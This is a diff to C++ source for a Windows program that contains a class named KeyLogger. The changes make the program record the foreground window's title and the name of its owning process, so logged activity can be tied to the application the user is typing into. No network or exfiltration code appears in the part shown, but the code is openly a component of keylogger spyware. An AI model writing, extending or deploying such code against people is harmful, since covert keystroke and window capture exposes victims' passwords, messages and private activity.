@@ -136,44 +136,10 @@ class KeyLogger {
         KeyLogger::Start([](char c){}, callback);
     }
 };
-/*
-* Return the current pressed key or null
-*/
-std::string GetActiveWindowTitle()
-{
-    //LPSTR wnd_title;
-    char wnd_title[256];
-    char wnd_path[256];
-    // get handle of currently active window
-    HWND hwnd = GetForegroundWindow();
-    // get title text of currently active window
-    GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
-    // get exe path of currently active window
-    GetWindowModuleFileNameA(hwnd, wnd_path, sizeof(wnd_path));
-    std::string title = wnd_title;
-    std::string path = wnd_path;
-    return title;
-}
-/// <summary>
-/// 
-/// </summary>
-class Monitor {
-public: static std::string onWindowChange(std::string activeWindow, const std::function<void(std::string)>& callback)
-    {
-        std::string newActiveWindow = GetActiveWindowTitle();
-        if (newActiveWindow != activeWindow) {
-            activeWindow = newActiveWindow;
-            callback(activeWindow);
-        }
-        return activeWindow;
-    }
-};
-
-
 // To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
 // and compile with -DPSAPI_VERSION=1
 
-void PrintProcessNameAndID(DWORD processID)
+std::string PrintProcessNameAndID(DWORD processID)
 {
     TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
 
@@ -200,13 +166,50 @@ void PrintProcessNameAndID(DWORD processID)
 
     // Print the process name and identifier.
 
-    _tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);
+    // _tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);
 
     // Release the handle to the process.
 
     CloseHandle(hProcess);
+    std::wstring name = szProcessName;
+    std::string result = std::string(name.begin(), name.end());
+    return result;
 }
 
+/*
+* Return the current pressed key or null
+*/
+std::string GetActiveWindowTitle()
+{
+    //LPSTR wnd_title;
+    char wnd_title[256];
+    char wnd_path[256];
+    // get handle of currently active window
+    HWND hwnd = GetForegroundWindow();
+    // get title text of currently active window
+    GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
+    // get exe path of currently active window
+    GetWindowModuleFileNameA(hwnd, wnd_path, sizeof(wnd_path));
+    DWORD dwProcId = 0;
+    GetWindowThreadProcessId(hwnd, &dwProcId);
+    std::string title = wnd_title;
+    std::string path = PrintProcessNameAndID(dwProcId);
+    return path + " | " + title;
+}
+/// <summary>
+/// 
+/// </summary>
+class Monitor {
+    public: static std::string onWindowChange(std::string activeWindow, const std::function<void(std::string)>& callback)
+    {
+        std::string newActiveWindow = GetActiveWindowTitle();
+        if (newActiveWindow != activeWindow) {
+            activeWindow = newActiveWindow;
+            callback(activeWindow);
+        }
+        return activeWindow;
+    }
+};
 /// <summary>
 /// 
 /// </summary>
